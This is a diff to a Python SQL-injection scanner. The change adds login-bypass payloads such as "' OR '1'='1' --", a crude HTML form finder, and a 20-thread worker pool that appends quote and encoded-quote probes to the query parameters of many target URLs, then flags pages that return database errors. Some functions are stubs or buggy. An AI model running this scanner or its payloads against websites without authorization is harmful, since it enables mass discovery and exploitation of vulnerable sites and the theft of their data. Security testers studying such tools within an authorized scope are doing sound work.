@@ -1,29 +1,39 @@
 #!/usr/bin/python3
 #1.0-beta
 
-import time
-import signal
-import multiprocessing
-import urllib
 import logging
+import queue
+import time
+import threading
 import multiprocessing
-
-logger = logging.getLogger(name="python-scan")
-
-import src.std as std
+import subprocess
+import src.web.web as web
 import src.sqlerrors as sqlerrors
-from src.web import web
 import urllib.parse as parse
+import re
 
-def init():
-    signal.signal(signal.SIGINT, signal.SIG_IGN)
+__name__ = "python-scanner"
+
+logger  = logging.getLogger(__name__)
+
+def exec_post(url, proxy=None):
+    payloads = ("' OR '1'='1' --", "' OR '1'='1' /*", "' OR '1'='1' #", "' OR '1'=1' %00", "' OR '1'='1' %16")
+    for payload in payloads:
+        print(payload)
+    return url
+
+def find_form(html, proxy=None):
+    if html is not "":
+        forms = re.findall("<form.*", str(html))
+        for form in forms:
+            pass
+        return forms
 
 def sqli(url, proxy=None):
     """check SQL injection vulnerability"""
     
-    logger.info("Starting SQLI payloads on: %s", url)
-    
-    
+    logger.debug("Starting SQLI payloads on: %s" % (url) ) 
+
     domain = parse.urlparse(url)  # domain with path without queries
     #print(domain.hostname)
     queries = domain.query.split("&")
@@ -31,51 +41,78 @@ def sqli(url, proxy=None):
     if not any(queries):
         #std.stdebug("No queries in URL %s." % (url), end="\n")
         #std.stdebug("", end="\n") # move cursor to new line
-        logger.info("No queries in URL %s to test SQLi.", url)
-        return False, url
+        logger.debug("No queries in URL %s to test SQLi. Will attempt to look for POST forms." %  (url) )
+        
+        html = web.gethtml(url, proxy=proxy)
+        resForm = find_form(html, proxy=proxy)
+        if resForm is not None:
+            for form in resForm:
+                logger.debug("Found %s ", str(form) )
+            #return True, url
+        else:
+            logger.debug("No forms found....")
+            #return False, url
     else:
         domain = domain.geturl().split("?")[0]
-        logger.info("Queries found!")
+        logger.debug("Found queries in %s to test SQLi.",  domain)
         payloads = ("'", "')", "';", '"', '")', '";', '`', '`)', '`;', '\\', "%27", "%%2727", "%25%27", "%60", "%5C")
         for payload in payloads:
             website = domain + "?" + ("&".join([param + payload for param in queries]))
-            logger.info("Fetching content of URL %s with PAYLOAD: [%s]", url ,payload )
-            logger.info("Full URL: %s", website)
-            if proxy is not None:
-                source = web.gethtml(website, prx=proxy)
-                #print(source)
-            else:
-                source = web.gethtml(website)
-                #print(source)
+            logger.debug("Fetching content of URL %s with PAYLOAD: [%s]\n[%s]" %  (url ,payload, website) )
+            source = web.gethtml(website, proxy=proxy)
             if source:
                 vulnerable, db = sqlerrors.check(source)
                 if vulnerable is True and db != None:
                     logger.info("Target URL is vulnerable")
                     return True, url, db
-                else:
-                    logger.info("Target URL is not vulnerable.")
+            else:
+                logger.debug("Unable to fetch website source.")
 
-    #print("\n")  # move cursor to new line
-    return False, None
+    print("\n")  # move cursor to new line
+    return False, url
 
-def scan(urls, prx=None):
+def scan(urls, proxy=None, threads=20):
     """scan multiple websites with multi processing"""
 
-    vulnerables = []
-    nonvuln     = []
+    logger.debug("Starting scanner.")
+    vulnerables = [] 
+    tested = []
 
-    childs      = []  # store child processes
-    max_processes = multiprocessing.cpu_count() * 4
-    pool = multiprocessing.Pool(max_processes, init)
+    q   = queue.Queue()
+    
+    logger.info("Starting on %s", len(urls) )
 
-    results = [pool.apply_async(sqli, args=(url, prx) ) for url in urls]
-    for r in results:
-        result = r.get()
-        if result[0] is True:
-            url     = result[1]
-            db      = result[2]
-            vulnerables.append((url, db))
-            logger.info("Target %s is vulnerable with database %s", url, db)
+    def worker():
+        logger.debug("Starting worker.")
+        while True:
+            time.sleep(0.2)
+            url, proxy = q.get() # get queue item
+            print(url)
+            logger.debug("Starting SQLI payloads on %s -> %s", proxy, url)
+            test = sqli(url, proxy)
+            if test[0]:
+                logger.debug("vulnerable URL found  %s ", test[1] )
+                tested.append((test))
+            q.task_done()
+            logger.debug("Thread finished.")
+            #print(test)
 
-    return vulnerables
+    for url in urls:
+        #print(url)
+        q.put((url, proxy))
+
+    for i in range(threads):
+        t = threading.Thread(target=worker)
+        logger.debug("Starting thread: %s ", t.name)
+        t.daemon = True
+        time.sleep(1)
+        t.start()
+        #t.join()
+
+    logger.debug("Waiting for threads to finish to join.")
+    q.join()
+    #t.join()
+    
+    logger.debug("Done waiting for threads, all finished and returning %s results", len(tested))
+    return tested
 
